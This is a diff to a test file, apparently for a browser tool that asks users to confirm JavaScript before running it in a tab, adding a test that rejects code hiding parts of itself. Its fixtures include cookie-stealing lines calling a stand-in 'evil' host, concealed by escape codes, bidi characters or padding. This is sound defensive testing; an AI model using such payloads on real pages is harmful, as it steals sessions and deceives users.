@@ -113,7 +113,19 @@ test("eval shows its code and host and runs only when confirmed", async () => {
   await confirmEval("document.title", "example.com", confirm);
   await assert.rejects(confirmEval("document.cookie", "example.com", confirm), /did not allow this eval/);
   await assert.rejects(confirmEval("  ", "example.com", confirm), /eval needs code/);
-  assert.deepEqual(shown, [["Run this JavaScript in the example.com tab?", "document.title"], ["Run this JavaScript in the example.com tab?", "document.cookie"]]);
+  assert.deepEqual(shown, [["Run this 1-line JavaScript in the example.com tab?", "document.title"], ["Run this 1-line JavaScript in the example.com tab?", "document.cookie"]]);
+});
+
+test("eval refuses code that could hide part of itself from the confirm", async () => {
+  const confirm = async () => { throw new Error("should not ask"); };
+  for (const code of ["document.title\u001b[8m;fetch('//evil/?'+document.cookie)\u001b[0m", "fetch('//evil')\rdocument.title", "a\u0085b", "x‮)(lave"]) {
+    await assert.rejects(confirmEval(code, "example.com", confirm), /control or bidi characters/);
+  }
+  await assert.rejects(confirmEval(`fetch('//evil')${"\n".repeat(100)}document.title`, "example.com", confirm), /limited to 30 lines/);
+  await assert.rejects(confirmEval(`document.title;${" ".repeat(2_000)}fetch('//evil')`, "example.com", confirm), /1500 characters/);
+  const shown: string[] = [];
+  await confirmEval("const a = 1;\n\treturn a;", "example.com", async title => { shown.push(title); return true; });
+  assert.deepEqual(shown, ["Run this 2-line JavaScript in the example.com tab?"]);
 });
 
 test("tabs shows a tab that has not loaded yet as loading, only the host of unapproved tabs, and only the scheme of non-web tabs", async () => {
